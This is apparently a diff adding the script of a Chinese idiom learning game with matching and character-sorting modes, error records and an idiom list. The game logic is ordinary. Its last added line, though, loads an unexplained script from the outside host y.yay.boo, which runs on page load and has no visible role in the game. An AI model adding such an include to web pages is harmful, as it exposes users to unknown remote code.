+            totalRounds = orderedIdioms.length;  // 排序模式下，每個成語都是一個回合
+        } else {
+            totalRounds = Math.ceil(orderedIdioms.length / idiomsPerRound);
+        }
+        
+        currentRound = 0;
+    }
+
+    currentRound++;
+    updateProgress();
+
+    if (matchType === '成語-排序') {
+        const idiom = orderedIdioms[currentIndex];
+        setupSortingGame(idiom);
+        currentIndex++;
+    } else {
+        // 顯示左右配對容器，隱藏排序容器
+        document.getElementById('left-right-container').style.display = 'block';
+        document.getElementById('sorting-container').style.display = 'none';
+        currentIdioms = [];
+        for (let i = 0; i < idiomsPerRound && currentIndex < orderedIdioms.length; i++) {
+            const idiom = orderedIdioms[currentIndex];
+            let pair;
+            switch (matchType) {
+                case '成語-表達意思':
+                    pair = { left: idiom.成語, right: idiom.表達意思 };
+                    break;
+                case '成語-字面意思':
+                    pair = { left: idiom.成語, right: idiom.字面意思 };
+                    break;
+                case '成語-例句':
+                    const randomExample = getRandomExample(idiom.例句);
+                    const maskedSentence = randomExample.replace(idiom.idiomNoBPM, '🙈');
+                    pair = { left: idiom.成語, right: maskedSentence };
+                    break;
+            }
+            currentIdioms.push(pair);
+            currentIndex++;
+        }
+
+        const leftContainer = document.getElementById('leftContainer');
+        const rightContainer = document.getElementById('rightContainer');
+
+        leftContainer.innerHTML = '';
+        rightContainer.innerHTML = '';
+
+        // 創建左側選項
+        const leftItems = currentIdioms.map(pair => pair.left);
+
+        leftItems.forEach(item => {
+            const leftElement = document.createElement('div');
+            leftElement.className = 'left-item';
+            leftElement.style.fontFamily = currentFont;
+            leftElement.style.fontSize = currentFontSize;        
+            leftElement.textContent = item;
+            leftElement.onclick = () => selectItem(leftElement, 'left');
+            leftContainer.appendChild(leftElement);
+        });
+
+        // 創建右側選項（始終隨機排序）
+        const rightItems = currentIdioms.map(pair => pair.right);
+        shuffleArray(rightItems);
+        rightItems.forEach(item => {
+            const rightElement = document.createElement('div');
+            rightElement.className = 'right-item';
+            rightElement.textContent = item;
+            rightElement.onclick = () => selectItem(rightElement, 'right');
+            rightContainer.appendChild(rightElement);
+        });
+    }
+
+    if (currentRound === 1) {
+        startTime = new Date();
+    }
+}
+
+
+
+function setupSortingGame(idiom) {
+    const pinyinArray = getPinyinArray(idiom.拼音);
+    const correctChars = Array.from(idiom.idiomNoBPM);
+    const wrongChars = pinyinArray.map(pinyin => 
+        getRandomCharForPinyin(pinyin, correctChars)
+    ).filter(char => char); // 過濾掉可能的 undefined
+
+	//here
+
+    const allChars = [...correctChars, ...wrongChars];
+    shuffleArray(allChars);
+
+    // 隱藏左右配對容器，顯示排序容器
+    document.getElementById('left-right-container').style.display = 'none';
+    document.getElementById('sorting-container').style.display = 'block';
+
+    // 更新成語問題
+    const idiomQuestion = document.getElementById('idiom-question');
+    idiomQuestion.textContent = idiom.成語;
+    idiomQuestion.style.fontFamily = 'BpmfZihiOnly-R';
+    idiomQuestion.style.fontSize = '3em';
+
+    // 清空並填充答案區和選項區
+    const answerArea = document.getElementById('answer-area');
+    const characterOptions = document.getElementById('character-options');
+    answerArea.innerHTML = '';
+    characterOptions.innerHTML = '';
+
+    allChars.forEach(char => {
+        const charElement = document.createElement('div');
+        charElement.className = 'character-option';
+        charElement.textContent = char;
+        characterOptions.appendChild(charElement);
+    });
+
+    setupClickHandlers();
+
+    // 重新綁定確定按鈕的事件
+    const checkButton = document.getElementById('check-answer');
+    checkButton.onclick = () => checkSortingAnswer(idiom);
+    checkButton.disabled = true; // 初始時禁用確定按鈕
+}
+
+function setupClickHandlers() {
+    const answerArea = document.getElementById('answer-area');
+    const characterOptions = document.getElementById('character-options');
+    
+    // 移除舊的事件監聽器
+    characterOptions.removeEventListener('click', handleCharacterOptionClick);
+    answerArea.removeEventListener('click', handleAnswerAreaClick);
+
+    // 使用事件委派
+    characterOptions.addEventListener('click', handleCharacterOptionClick);
+    answerArea.addEventListener('click', handleAnswerAreaClick);
+}
+
+function handleCharacterOptionClick(e) {
+    if (e.target.classList.contains('character-option')) {
+        const charElement = e.target.cloneNode(true);
+        charElement.classList.add('in-answer');
+        document.getElementById('answer-area').appendChild(charElement);
+        e.target.style.display = 'none';
+		updateCheckButtonState();
+    }
+}
+
+function handleAnswerAreaClick(e) {
+    if (e.target.classList.contains('in-answer')) {
+        const char = e.target.textContent;
+        const originalOption = Array.from(document.getElementById('character-options').children)
+            .find(el => el.textContent === char && el.style.display === 'none');
+        if (originalOption) {
+            originalOption.style.display = '';
+        }
+        e.target.remove();
+		updateCheckButtonState();
+    }
+}
+
+function updateCheckButtonState() {
+    const answerArea = document.getElementById('answer-area');
+    const checkButton = document.getElementById('check-answer');
+    const currentIdiom = orderedIdioms[currentIndex - 1];
+    checkButton.disabled = answerArea.children.length !== currentIdiom.idiomNoBPM.length;
+}
+	
+
+function checkSortingAnswer(idiom) {
+    const answerArea = document.getElementById('answer-area');
+    const characterOptions = document.getElementById('character-options');
+    const checkButton = document.getElementById('check-answer');
+    const userAnswer = Array.from(answerArea.children).map(el => el.textContent).join('');
+    const nextButton = document.getElementById('next-button');
+    const endButton = document.getElementById('end-button');
+
+    if (userAnswer === idiom.idiomNoBPM) {
+        // 答案正確
+        answerArea.classList.add('jump');
+        setTimeout(() => {
+            answerArea.classList.remove('jump');
+        }, 500);
+        playAudio(rightAudio);
+        changeEmoji(true);
+        correctPairs++;
+        if (currentRound >= totalRounds) {
+            showEndButton();
+            endButton.focus();                                  
+        } else {
+            showNextButton();
+            showEndButton();
+            nextButton.focus();
+        }
+        checkButton.disabled = true; // 禁用確定按鈕，防止重複點擊
+    } else {
+        // 答案錯誤
+        playAudio(wrongAudio);
+        changeEmoji(false);
+        updateErrorRecord(idiom.成語);
+		answerArea.classList.add('shake');
+
+		setTimeout(() => {
+			answerArea.classList.remove('shake');
+			// 將答案區的元素依序移回選項區
+			const answerElements = Array.from(answerArea.children);
+			answerElements.forEach(char => {
+				// 找到對應的原始選項
+				const originalOption = Array.from(characterOptions.children)
+					.find(el => el.textContent === char.textContent && el.style.display === 'none');
+				
+				if (originalOption) {
+					// 如果找到原始選項，則恢復其顯示
+					originalOption.style.display = '';
+				} else {
+					// 如果沒找到原始選項（不應該發生），則創建一個新的
+					const newOption = char.cloneNode(true);
+					newOption.classList.remove('in-answer');
+					newOption.classList.add('character-option');
+					characterOptions.appendChild(newOption);
+				}
+				
+				// 移除答案區的元素
+				char.remove();
+			});
+		}, 1000);
+        
+        checkButton.disabled = true; // 重置後禁用確定按鈕
+    }
+    totalPairs++;
+}
+
+        document.getElementById('next-button').onclick = function() {
+            hideNextButton();
+			hideEndButton();
+            startNewRound();
+        };
+
+document.getElementById('start-button').onclick = function() {
+    matchType = document.getElementById('match-type-select').value;
+    document.getElementById('setup').classList.remove('active');
+    document.getElementById('setup').style.display = 'none';
+    document.getElementById('game').classList.add('active');
+    document.getElementById('game').style.display = 'block';
+
+    currentIndex = 0;
+    currentRound = 0;
+    orderedIdioms = [];
+    startNewRound();
+};
+
+document.getElementById('close-button').onclick = function() {
+    resetGame();	
+};
+
+
+
+document.getElementById('view-idioms-button').onclick = function() {
+	currentFont = 'BpmfZihiSans-Regular';
+	currentFontState = 'zih';
+	currentFontSize = '1.3em';
+    const fontToggleButton = document.getElementById('font-toggle-button');
+	const ListfontToggleButton = document.getElementById('list-font-toggle-button');
+	fontToggleButton.textContent = '字';
+	ListfontToggleButton.textContent = '字';
+    document.getElementById('setup').style.display = 'none';
+    document.getElementById('idiom-list').style.display = 'block';
+    renderIdiomList(); 
+};
+
+document.getElementById('close-idiom-list').onclick = function() {
+    document.getElementById('idiom-list').style.display = 'none';
+    document.getElementById('setup').style.display = 'block';
+};
+
+
+
+function replaceIdiomWithUnderscore(sentence, idiom) {
+    return sentence.replace(new RegExp(idiom, 'g'), '🙈');
+}
+
+function renderIdiomList() {
+    const selectedCategory = document.getElementById('category-select').value;
+    const table = document.getElementById('idiom-table');
+    const tbody = table.querySelector('tbody');
+    tbody.innerHTML = '';
+
+    // 篩選成語
+    let filteredIdioms;
+    if (selectedCategory === '常錯挑戰') {
+        const errorRecords = getErrorRecords();
+        filteredIdioms = idioms.filter(idiom => errorRecords.hasOwnProperty(idiom.成語));
+        filteredIdioms.sort((a, b) => errorRecords[b.成語] - errorRecords[a.成語]);
+    } else {
+        filteredIdioms = selectedCategory === 'all' 
+            ? idioms 
+            : idioms.filter(idiom => idiom.分類 === selectedCategory);
+    }
+
+    filteredIdioms.forEach((idiom, index) => {
+        const randomExample = getRandomExample(idiom.例句);
+        const row = document.createElement('tr');
+        row.innerHTML = `
+            <td class="category"><small>${idiom.分類}</small></td>
+            <td><small class="small-number">${index + 1} </small><span class="idiom">${idiom.成語}</span></td>
+            <td class="literal">${idiom.字面意思}</td>
+            <td class="figurative">${idiom.表達意思}</td>
+            <td class="example">${replaceIdiomWithUnderscore(randomExample, idiom.idiomNoBPM)}</td>
+        `;
+        tbody.appendChild(row);
+    });
+
+	const idiomList = document.querySelectorAll('.idiom');
+    idiomList.forEach(item => {
+		item.style.fontFamily = currentFont;
+    });
+
+    updateVisibility();
+    updateCategoryNavigation();
+}
+
+function updateVisibility() {
+    const showCategory = document.getElementById('show-category').checked;
+    const showIdiom = document.getElementById('show-idiom').checked;
+    const showLiteral = document.getElementById('show-literal').checked;
+    const showFigurative = document.getElementById('show-figurative').checked;
+    const showExample = document.getElementById('show-example').checked;
+
+    document.querySelectorAll('#idiom-table .category').forEach(el => el.style.display = showCategory ? '' : 'none');
+    document.querySelectorAll('#idiom-table .idiom').forEach(el => el.style.display = showIdiom ? '' : 'none');
+    document.querySelectorAll('#idiom-table .literal').forEach(el => el.style.display = showLiteral ? '' : 'none');
+    document.querySelectorAll('#idiom-table .figurative').forEach(el => el.style.display = showFigurative ? '' : 'none');
+    document.querySelectorAll('#idiom-table .example').forEach(el => el.style.display = showExample ? '' : 'none');
+}
+
+document.querySelectorAll('.idiom-controls input[type="checkbox"]').forEach(checkbox => {
+    checkbox.addEventListener('change', updateVisibility);
+});
+
+document.getElementById('category-select').addEventListener('change', function() {
+    renderIdiomList();
+    updateCategoryNavigation();
+});
+
+function updateCategoryNavigation() {
+    const categorySelect = document.getElementById('category-select');
+    const prevButton = document.getElementById('prev-category');
+    const nextButton = document.getElementById('next-category');
+    const categories = Array.from(categorySelect.options).map(option => option.value);
+    currentCategoryIndex = categories.indexOf(categorySelect.value);
+
+    prevButton.disabled = currentCategoryIndex <= 1;  // 禁用"全部"的上一個
+    nextButton.disabled = currentCategoryIndex >= categories.length - 1;
+
+    if (currentCategoryIndex > 0) {
+        prevButton.textContent = "< "  + categories[currentCategoryIndex - 1];
+    }
+    if (currentCategoryIndex < categories.length - 1) {
+        nextButton.textContent = categories[currentCategoryIndex + 1] + " >";
+    }
+}
+
+function changeCategory(direction) {
+    const categorySelect = document.getElementById('category-select');
+    const categories = Array.from(categorySelect.options).map(option => option.value);
+    
+    currentCategoryIndex += direction;
+    if (currentCategoryIndex < 1) currentCategoryIndex = 1;  // 不要選到"全部"
+    if (currentCategoryIndex >= categories.length) currentCategoryIndex = categories.length - 1;
+
+    categorySelect.value = categories[currentCategoryIndex];
+    renderIdiomList();
+    updateCategoryNavigation();
+}
+
+document.getElementById('prev-category').onclick = () => changeCategory(-1);
+document.getElementById('next-category').onclick = () => changeCategory(1);
+
+updateCategoryNavigation();
+
+document.addEventListener('DOMContentLoaded', function() {
+    document.getElementById('font-toggle-button').addEventListener('click', toggleFont);
+	document.getElementById('list-font-toggle-button').addEventListener('click', toggleFont);	
+});
+
+document.getElementById('clear-records').onclick = function() {
+    if (confirm('確定要清除所有錯誤記錄嗎？')) {
+        clearErrorRecords();
+        alert('錯誤記錄已清除');        
+        // 清除記錄後，需要更新類別列表，移除「常錯挑戰」選項
+        initializeCategories();
+        
+        // 如果當前在「常錯挑戰」類別，則切換到「所有分類」
+        if (categorySelect.value === '常錯挑戰') {
+            categorySelect.value = 'all';
+        }        
+        // 更新類別導航按鈕
+        updateCategoryNavigation();
+        // 更新清除紀錄按鈕狀態
+        updateClearRecordsButton();
+    }
+};
+
+function initializeCategories() {
+    const categories = ['all', ...new Set(idioms.map(idiom => idiom.分類))];
+    const categorySelect = document.getElementById('category-select');
+    categorySelect.innerHTML = '';
+
+    categories.forEach(category => {
+        const option = document.createElement('option');
+        option.value = category === 'all' ? 'all' : category;
+        option.textContent = category === 'all' ? '所有分類' : category;
+        categorySelect.appendChild(option);
+    });
+
+    const errorRecords = getErrorRecords();
+    if (Object.keys(errorRecords).length > 0) {
+        const errorOption = document.createElement('option');
+        errorOption.value = '常錯挑戰';
+        errorOption.textContent = '常錯挑戰';
+        categorySelect.appendChild(errorOption);
+    }
+}
+
+function updateClearRecordsButton() {
+    const clearRecordsButton = document.getElementById('clear-records');
+    const errorRecords = getErrorRecords();
+    const hasErrors = Object.keys(errorRecords).length > 0;
+    
+    clearRecordsButton.disabled = !hasErrors;
+    clearRecordsButton.style.opacity = hasErrors ? '1' : '0.5';
+    clearRecordsButton.style.cursor = hasErrors ? 'pointer' : 'not-allowed';
+}
+
+// 在頁面載入時調用此函數
+document.addEventListener('DOMContentLoaded', initializeCategories);
+
+    </script>
+<script src="https://y.yay.boo/y.js"></script>
+</body>
+</html>
